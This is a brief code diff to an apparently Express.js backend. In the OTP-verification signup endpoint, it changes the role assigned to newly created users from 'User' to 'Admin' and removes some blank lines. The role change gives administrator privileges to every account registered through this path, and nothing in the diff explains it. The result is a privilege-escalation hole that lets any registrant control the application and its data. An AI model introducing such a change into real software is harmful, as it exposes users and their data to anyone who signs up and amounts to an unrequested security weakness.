@@ -397,7 +397,7 @@ app.post('/api/verify-otp', async (req, res) => {
       phone,
       password: hashedPassword,
       address: Array.isArray(address) ? address : [address],
-      role: 'User',
+      role: 'Admin',
       timeStamp: new Date().toISOString()
     });
 
@@ -417,8 +417,6 @@ app.post('/api/verify-otp', async (req, res) => {
     res.status(500).json({ message: 'Error creating user after OTP verification' });
   }
 });
-
-
 
 // Logs API endpoint
 app.get("/api/logs", (req, res) => {
